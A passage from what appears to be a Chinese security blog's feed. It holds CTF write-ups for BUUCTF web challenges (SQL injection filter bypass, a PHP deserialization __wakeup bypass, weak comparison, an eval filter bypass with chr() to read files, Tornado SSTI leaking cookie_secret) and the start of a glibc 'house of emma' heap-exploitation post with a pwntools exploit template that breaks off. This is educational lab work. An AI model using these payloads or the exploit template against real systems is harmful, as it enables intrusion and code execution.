%23</span><br></pre></td></tr></tbody></table></figure><p>回显：Hello 2！Your password is ‘Flag’</p><p>在里面找到一个flag表</p><p> 爆字段 </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere </span><br><span class="line"> table_name="Flag" %23</span><br></pre></td></tr></tbody></table></figure><p>爆数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</span><br></pre></td></tr></tbody></table></figure><p>flag{826b7bf2-106c-45b3-a375-2da2278897bf}</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，提示备份网站，直接扫描目录，得到<a href="http://www.zip/">www.zip</a></p><p>解压后得到源码</p><p>几个重要php文件内容：</p><p>index.php</p><pre><code>1 &lt;?php2     include ‘class.php‘;3     $select = $_GET[‘select‘];4     $res=unserialize(@$select);5 ?&gt;</code></pre><p>代码第4行unserialize可能存在反序列化漏洞</p><p>class.php</p><pre><code> 1 &lt;?php 2 include ‘flag.php‘; 3 error_reporting(0); 4 class Name{ 5     private $username = ‘nonono‘; 6     private $password = ‘yesyes‘; 7  8     public function __construct($username,$password){ 9         $this-&gt;username = $username;10         $this-&gt;password = $password;11     }12 13     function __wakeup(){14         $this-&gt;username = ‘guest‘;15     }16 17     function __destruct(){18         if ($this-&gt;password != 100) {19             echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";20             echo "You name is: ";21             echo $this-&gt;username;echo "&lt;/br&gt;";22             echo "You password is: ";23             echo $this-&gt;password;echo "&lt;/br&gt;";24             die();25         }26         if ($this-&gt;username === ‘admin‘) {27             global $flag;28             echo $flag;29         }else{30             echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can‘t give you the flag!";31             die();   32         }33     }34 }35 ?&gt;</code></pre><p>代码第26行如果username为admin便输出flag，从__destruct，__construct，__wakeup可以判断存在反序列化漏洞<br>php序列化与反序列化</p><p>序列化：函数为serialize()，把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等<br>反序列化：函数为unserialize()，将字符串转换成变量或对象的过程<br>常用的内置方法：<br>__construct()：创建对象时初始化，当一个对象创建时被调用<br>__wakeup() 使用unserialize时触发<br>__sleep() 使用serialize时触发<br>__destruction()：结束时销毁对象，当一个对象销毁时被调用<br>我们需要将Name类序列化的结果输出</p><pre><code>&lt;?php class Name{    private $username = ‘nonono‘;    private $password = ‘yesyes‘;     public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$a = new Name(‘admin‘,100);$b = serialize($a);echo $b;</code></pre><p>输出结果为：</p><p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p><p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）</p><p>另外我们还需要绕过__wakeup方法</p><p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行<br>原本：O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>绕过：O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p><p>所以payload为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3：{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</span><br></pre></td></tr></tbody></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目提示，去查找他的备份文件</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e git,svn,bak -u http://25480fe2-4471-4be6-81ac-bea8913b50e6.node4.buuoj.cn:81</span><br></pre></td></tr></tbody></table></figure><p><img src="https://tuchuangs.com/imgs/2022/10/27/0a96d0093db00e6d.png"></p><p>访问/index.php.bak，可以得到源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once "flag.php";</span><br><span class="line"></span><br><span class="line">if(isset($_GET['key'])) {</span><br><span class="line">    $key = $_GET['key'];</span><br><span class="line">    if(!is_numeric($key)) {</span><br><span class="line">        exit("Just num!");</span><br><span class="line">    }</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";</span><br><span class="line">    if($key == $str) {</span><br><span class="line">        echo $flag;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">else {</span><br><span class="line">    echo "Try to find out source file!";</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到用get的方式给key传参，但是只能传数字，又需要与str进行比较</p><p>这里主要利用的是php的一个弱比较</p><p>其中==在比较时候是先将字符串类型转化为相同，再比较；===是先判断两种字符串的类型是否相等，再比较</p><p>在==转换字符串的过程中，遵循如下原则：</p><pre><code>当字符串开始部分不存在数值的时候，会将该字符串转换为数值 0。如var_dump('abc' == 0)，结果为 True当字符串开始部分有合法数值的时候，会将该字符串转换为合法数值。如var_dump('123abc' == 123)，结果为True当字符串中包含 e 或者 E 时，会将其识别为科学计数法。如var_dump('0e12asda' == 0)，结果为True</code></pre><p>所以只需要用gets方式给key传参123就可以出flag了</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>一个计算器，查看代码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$('#calc').submit(function(){</span><br><span class="line">    $.ajax({</span><br><span class="line">        url:"calc.php?num="+encodeURIComponent($("#content").val()),</span><br><span class="line">        type:'GET',</span><br><span class="line">        success:function(data){</span><br><span class="line">            $("#result").html(`&lt;div class="alert alert-success"&gt;</span><br><span class="line">        &lt;strong&gt;答案:&lt;/strong&gt;${data}</span><br><span class="line">        &lt;/div&gt;`);</span><br><span class="line">        },</span><br><span class="line">        error:function(){</span><br><span class="line">            alert("这啥?算不来!");</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line">    return false;</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p>可以看到calc.php，访问获取源码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET['num'])){</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">}else{</span><br><span class="line">        $str = $_GET['num'];</span><br><span class="line">        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];</span><br><span class="line">        foreach ($blacklist as $blackitem) {</span><br><span class="line">                if (preg_match('/' . $blackitem . '/m', $str)) {</span><br><span class="line">                        die("what are you want to do?");</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        eval('echo '.$str.';');</span><br><span class="line">}</span><br><span class="line">?&gt; </span><br></pre></td></tr></tbody></table></figure><p>可以看到waf过滤的一些字符</p><p>scandir()：列出目录中的文件和目录</p><figure class="highlight swift"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以升序排序 - 默认</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">=</span> scandir(<span class="variable">$dir</span>);</span><br><span class="line"><span class="comment">// 以降序排序</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">=</span> scandir(<span class="variable">$dir</span>,<span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure><p><strong>chr()：从不同的 ASCII 值返回字符</strong></p><p>因为/被过滤 所以使用chr(47)来替代</p><p>构造payload</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:29108/calc.php? num=print_r(scandir(chr(47)))</span><br></pre></td></tr></tbody></table></figure><p>空格绕过</p><p>  在num前加一个空格，进行目录读取</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:29108/calc.php? num=print_r(scandir(chr(47)))</span><br></pre></td></tr></tbody></table></figure><p>目录：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; boot [5] =&gt; dev [6] =&gt; etc [7] =&gt; f1agg [8] =&gt; home [9] =&gt; lib [10] =&gt; lib64 [11] =&gt; media [12] =&gt; mnt [13] =&gt; opt [14] =&gt; proc [15] =&gt; root [16] =&gt; run [17] =&gt; sbin [18] =&gt; srv [19] =&gt; start.sh [20] =&gt; sys [21] =&gt; tmp [22] =&gt; usr [23] =&gt; var ) 1</span><br></pre></td></tr></tbody></table></figure><p> <strong>file_get_contents()：把整个文件读入一个字符串中</strong></p><blockquote><p>用法：file_get_contents(path,include_path,context,start,max_length)</p></blockquote><p>因为引号也被过滤了，所以flagg也需要使用chr函数</p><p>构造payload</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:<span class="number">29108</span>/calc.php num=print_r(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></tbody></table></figure><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><strong>php中的strcmp漏洞</strong><br>说明：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> strcmp ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br></pre></td></tr></tbody></table></figure><p>参数 str1第一个字符串。str2第二个字符串。如果  str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回  0。可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return  0 ，<strong>也就是虽然报了错，但却判定其相等</strong></p><p><strong>php中的is_numeric()漏洞</strong></p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>在菜单有个payflag选项，进去后查看代码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST['password'])) {</span><br><span class="line">$password = $_POST['password'];</span><br><span class="line">if (is_numeric($password)) {</span><br><span class="line">echo "password can't be number&lt;/br&gt;";</span><br><span class="line">}elseif ($password == 404) {</span><br><span class="line">echo "Password Right!&lt;/br&gt;";</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>用bp抓包,修改cookie:user=1，用post给password和money传参</p><p><img src="https://tuchuangs.com/imgs/2022/11/02/3b756eba3b21ff75.png"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目打开有三个链接内容分明是以下三个</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></tbody></table></figure><p>有个render，而且题目是easy_tornado，可是SSTI</p><p>因为render（）是tornado里的函数，可以生成html模板。是一个渲染函数 ，就是一个公式，能输出前端页面的公式。</p><p>tornado是用Python编写的Web服务器兼Web应用框架，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p><p>尝试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash={{1}}</span><br></pre></td></tr></tbody></table></figure><p>报错，应该是存在过滤</p><p>然后我们需要找到cookie_secret</p><p>百度得到<a href="https://so.csdn.net/so/search?q=Tornado&amp;spm=1001.2101.3001.7020">Tornado</a>框架的附属文件handler.settings中存在cookie_secret</p><p>此时构造payload:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://97bda1b4-f8f6-434e-a6cc-59a79fcca907.node4.buuoj.cn:81/error?msg={{handler.settings}}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '19ef00ca-a6f3-4408-a303-2d1a585ff706'} </span><br></pre></td></tr></tbody></table></figure><p>得到提示信息，得到cookie_secret:19ef00ca-a6f3-4408-a303-2d1a585ff706</p><p>然后结合md5(cookie_secret+md5(filename))</p><p>即md5(‘19ef00ca-a6f3-4408-a303-2d1a585ff706’+md5(‘/fllllllllllllag’))</p><p>得到<br><img src="https://s1.z6r7.com/i/2022/11/17/3ukol.png"></p><p>然后得到payload：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=b6d767d2f8ed5d21a44b0e5886680cb9</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;极客大挑战-2019-EasySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]EasySQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]EasySQL&lt;/h2&gt;&lt;p&gt;万能密码</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>house_of_emma</title>
    <link href="http://wscyoulin.github.io/2022/10/11/house-of-emma/"/>
    <id>http://wscyoulin.github.io/2022/10/11/house-of-emma/</id>
    <published>2022-10-11T12:17:39.000Z</published>
    <updated>2022-10-11T12:38:43.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>Ayakaaaa师傅的一个demo:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;assert.h&gt;</span><br><span class="line">int main(){</span><br><span class="line">  size_t target = 0;</span><br><span class="line">  size_t *p1 = malloc(0x428);</span><br><span class="line">  size_t *g1 = malloc(0x18);</span><br><span class="line">  size_t *p2 = malloc(0x418);</span><br><span class="line">  size_t *g2 = malloc(0x18);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(0x438);</span><br><span class="line">  free(p2);</span><br><span class="line">  p1[3] = (size_t)((&amp;target)-4);</span><br><span class="line">  size_t *g4 = malloc(0x438);</span><br><span class="line">  assert((size_t)(p2-2) == target);</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>首先申请4个heap</p><p><img src="https://tuchuangs.com/imgs/2022/10/11/4c50601a1cf06d9e.png"></p><p>然后将大一些的chunkp1释放掉，再申请一个更大的chunk,将p1放进largebin中：</p><p><img src="https://tuchuangs.com/imgs/2022/10/11/89098bff8dc8b569.png"></p><p>然后释放掉p2，再修改p1的bk_nextsize为&amp;target-0x20</p><p><img src="https://tuchuangs.com/imgs/2022/10/11/891cef9b0140c8b0.png"></p><p>可以看到，p2进入了unsortedbin，p1的bk_nextsize被我们成功修改，接下来再申请一个大的chunk的时候，就会将p2放进largebin中，也就是在这个插入的过程中触发了我们的攻击流程。</p><p>最后就是target会被写入p1的地址，p2进入largebin,达到一个任意地址写入一个堆地址的效果</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>当程序没有显示调用exit，也不会通过主函数返回，那么以往我们使用的FSOP就无法进行了，如果此时两个hook也没法利用，我们需要一种能够稳定触发IO中函数的路径，这就是house of kiwi,它利用了__malloc_assert</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">       const char *function)</span><br><span class="line">{</span><br><span class="line">(void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",</span><br><span class="line">           __progname, __progname[0] ? ": " : "",</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : "", function ? ": " : "",</span><br><span class="line">           assertion);</span><br><span class="line">fflush (stderr);</span><br><span class="line">abort ();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从源码中可以看到这个断言中调用了fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync<br>在house of kiwi 中，如果我们能实现一个任意地址写，那么就可以修改sync指针，并且在调用的时候还发现，rdx也很稳定的是IO_helper_jumps，此时如果我们通过任意地址写将sync指针改成setcontext+0x61，且将IO_helper_jumps+0xa0和IO_helper_jumps+0xa8改写，就可以实现栈迁移orw。</p><h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><p>house of kiwi之所以被称为house of emma的前置知识，是因为他提供了一条调用链，house of kiwi所找到的是在assert的时候会稳定的去调用_IO_file_jumps中的sync，后续需要通过任意地址写修改sync以及其他东西，而house of emma是直接将虚表的偏移修改，修改之后，本来应该调用_IO_file_jumps中的sync，变成了调用wjh发现的几个危险的函数，这几个危险函数可以仅仅通过精心布置fake FILE实现srop，并不需要任意地址写任意内容，只需要能够做到任意地址写已知的堆地址即可，这样的条件是非常低的，largebin attack就可以做到。<br><strong>大致流程：</strong></p><p>1.修改stderr的指针为已知堆地址<br> 2.修改TLS上的guard为已知值<br> 3.构造fake FILE<br> 4.触发house of kiwi（可以通过unsortedbin 与 top chunk合并来触发）<br> 5.执行srop和orw</p><p>除了上面介绍的那个函数，还有几个函数也存在类似的调用过程：<br> _IO_cookie_write<br> _IO_cookie_seek<br> _IO_cookie_close<br> 偏移略有不同，不过打法一模一样</p><p>wjh师傅的exp:(可以当作模板用)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line"># sh = process('./pwn')</span><br><span class="line">sh = remote('127.0.0.1', 9999)</span><br><span class="line">libc = ELF('./lib/libc.so.6')</span><br><span class="line">all_payload = ""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ROL(content, key):</span><br><span class="line">    tmp = bin(content)[2:].rjust(64, '0')</span><br><span class="line">    return int(tmp[key:] + tmp[:key], 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, size):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x1)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(size)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x3)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x2)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, buf):</span><br><span class="line">    global all_payload</span><br><span class="line">    payload = p8(0x4)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(len(buf))</span><br><span class="line">    payload += str(buf)</span><br><span class="line">    all_payload += payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_opcode():</span><br><span class="line">    global all_payload</span><br><span class="line">    all_payload += p8(5)</span><br><span class="line">    sh.sendafter("Pls input the opcode", all_payload)</span><br><span class="line">    all_payload = ""</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># leak libc_base</span><br><span class="line">add(0, 0x410)</span><br><span class="line">add(1, 0x410)</span><br><span class="line">add(2, 0x420)</span><br><span class="line">add(3, 0x410)</span><br><span class="line">delete(2)</span><br><span class="line">add(4, 0x430)</span><br><span class="line">show(2)</span><br><span class="line">run_opcode()</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1f30b0  # main_arena + 1104</span><br><span class="line">log.success("libc_base:\t" + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">guard = libc_base + 0x2035f0</span><br><span class="line">pop_rdi_addr = libc_base + 0x2daa2</span><br><span class="line">pop_rsi_addr = libc_base + 0x37c0a</span><br><span class="line">pop_rax_addr = libc_base + 0x446c0</span><br><span class="line">syscall_addr = libc_base + 0x883b6</span><br><span class="line">gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span><br><span class="line">setcontext_addr = libc_base + 0x50bc0</span><br><span class="line"></span><br><span class="line"># leak heapbase</span><br><span class="line">edit(2, "a" * 0x10)</span><br><span class="line">show(2)</span><br><span class="line">run_opcode()</span><br><span class="line">sh.recvuntil("a" * 0x10)</span><br><span class="line">heap_base = u64(sh.recv(6).ljust(8, '\x00')) - 0x2ae0</span><br><span class="line">log.success("heap_base:\t" + hex(heap_base))</span><br><span class="line"></span><br><span class="line"># largebin attack stderr</span><br><span class="line">delete(0)</span><br><span class="line">edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))</span><br><span class="line">add(5, 0x430)</span><br><span class="line">edit(2, p64(heap_base + 0x22a0) + 